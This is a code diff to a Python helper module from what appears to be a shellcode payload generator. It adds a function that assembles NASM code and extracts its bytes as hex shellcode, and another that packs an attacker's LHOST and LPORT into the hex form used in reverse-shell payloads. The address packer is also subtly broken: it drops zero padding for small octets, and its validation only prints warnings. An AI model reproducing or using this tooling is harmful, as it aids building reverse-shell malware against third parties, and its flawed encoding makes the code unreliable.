@@ -1,4 +1,5 @@
 from scripts.hasher import hash
+import subprocess
 import ipaddress
 import locale
 import random
@@ -29,6 +30,33 @@ def sed_files(folderpath, old, new):
         filepath = os.path.join(folderpath, filename)
         if os.path.isfile(filepath):
             sed_file(filepath, old, new)
+
+def nasm2instructions(filepath):
+    print("\nSetting up shellcode...")
+    obj_file = "temp/shell.o"
+    shell_file = "temp/shell"
+    instructions_file = "temp/instructions_trash"
+
+    nasm_cmd = ["nasm", "-f", "elf64", filepath, "-o", obj_file]
+    ld_cmd = ["ld", "-w", obj_file, "-o", shell_file]
+    dd_cmd = ["dd", f"if={shell_file}", f"of={instructions_file}", "bs=1", "skip=4096", "count=1280"]
+    xxd_cmd = ["xxd", "-p", instructions_file]
+    try:
+        result = subprocess.run(nasm_cmd, check=True)
+
+        result = subprocess.run(ld_cmd, check=True)
+
+        subprocess.run(dd_cmd, check=True)
+
+        result = subprocess.run(f"xxd -p {instructions_file}", shell=True, check=True, capture_output=True, text=True)
+        hexa_content = result.stdout.strip()
+
+        instructions = hexa_content.split("00000000000000")[0].replace("\n", "")
+        return instructions
+    
+    except subprocess.CalledProcessError as e:
+        print(f"Erreur lors de l'exécution de la commande : {e}")
+        return None
 
 
 def txt2instructions(filepath):
@@ -158,3 +186,20 @@ def get_LCID(country_code):
         raise ValueError(f"'{country_code}' is not valid.")
     
     return result
+
+def format_lhost_lport(lhost, lport):
+    if lport > 65535 or lport < 0:
+        print("Port number must be between 0 and 65535")
+    if lhost.count(".") != 3:
+        print("Invalid IP address")
+
+    ip = lhost.split(".")
+    result = ""
+    for part in ip[::-1]:
+        result += hex(int(part))[2:]
+    
+    port_hex = hex(lport)[2:].zfill(4)
+    port_hex = port_hex[2:] + port_hex[:2]  # Swap bytes
+
+    result += port_hex
+    return hex(int(result, 16))
